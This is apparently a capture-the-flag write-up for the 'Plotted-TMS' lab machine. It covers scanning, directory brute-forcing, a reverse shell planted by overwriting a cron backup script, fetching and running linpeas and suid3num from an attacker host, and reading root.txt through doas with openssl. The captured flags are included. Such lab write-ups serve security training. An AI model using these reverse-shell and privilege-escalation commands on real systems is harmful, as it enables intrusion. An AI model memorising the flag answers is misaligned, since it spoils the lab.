# Plotted-TMS

![](../../.gitbook/assets/10.10.137.48.png)

## Task 1 Compromise

#### What is user.txt?

```bash
nmap -n -sV -sC 10.10.137.48
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 14-47-42.png>)

```bash
gobuster dir -u http://10.10.137.48 -w /usr/share/wordlists/common.txt \
             -t64
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 15-00-23.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-12 15-01-31.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-12 15-05-40.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-12 15-04-36.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-12 15-05-54.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-12 15-16-01.png>)

```bash
gobuster dir -u http://10.10.137.48:445 \
             -w /usr/share/dirb/wordlists/common.txt \
             -t64
gobuster dir -u http://10.10.137.48:445/management \
             -w /usr/share/dirb/wordlists/common.txt \
             -t64
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 15-13-38.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-12 18-05-37.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-12 15-13-12.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-12 15-16-49.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-12 16-05-23.png>) ![](<../../.gitbook/assets/Screenshot from 2022-03-12 16-29-07.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-12 16-29-30.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-12 18-01-26.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-12 16-34-23.png>)

```bash
nc -nvlp 4444
python3 -c 'import pty; pty.spawn("/bin/bash")'
find / -type f -name user.txt 2>/dev/null
cat /home/plot_admin/user.txt
ls -l /home/plot_admin/
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 16-42-05.png>)

```bash
wget http://10.6.9.176/linpeas.sh -P /tmp
bash /tmp/linpeas.sh
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 16-50-17.png>)

```bash
ls -ld /var/www/scripts/
cat /var/www/scripts/backup.sh
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 18-11-34.png>)

```bash
echo '#!/bin/bash' > /var/www/scripts/backup2.sh
echo 'sh -i >& /dev/tcp/10.6.9.176/4445 0>&1' >> /var/www/scripts/backup2.sh
chmod +x /var/www/scripts/backup2.sh 
mv -f /var/www/scripts/backup2.sh /var/www/scripts/backup.sh 
```

```bash
nc -nvlp 4445
python3 -c 'import pty; pty.spawn("/bin/bash")'
cat /home/plot_admin/user.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 18-21-17.png>)

{% hint style="success" %}
`77927510d5edacea1f9e86602f1fbadb`
{% endhint %}

#### What is root.txt?

```bash
wget http://10.6.9.176/suid3num.py
python3 suid3num.py
cat /etc/doas.conf
/usr/bin/doas openssl enc -in /root/root.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-03-12 18-25-38 (1).png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-12 18-26-14.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-12 18-28-23.png>)

{% hint style="success" %}
`53f85e2da3e874426fa059040a9bdcab`
{% endhint %}

## Xmind

{% file src="../../.gitbook/assets/10.10.137.48.xmind" %}
